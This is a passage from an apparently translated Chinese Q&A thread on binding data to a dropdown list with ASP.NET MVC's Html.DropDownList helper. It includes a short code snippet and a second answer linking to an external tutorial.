<%= Html.DropDownList(string.Empty, 
    "myDropDownList",  
    new SelectList((IEnumerable)ViewData["stuff"], 
        "DescriptionProperty", 
        "ValueProperty")) 
%> 
```

使用 MVC 中的下拉列表助手，您不会像在旧 ASP.NET 中那样真正将数据“绑定”到它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-07-09T17:01:05.733

[链接文本](http://www.altafkhatri.com/Technical/How_to_bind_IList_with_MVC_Dropdownlist_box)下面的链接提供了 2 种绑定下拉列表的方法。绑定下拉列表*************`*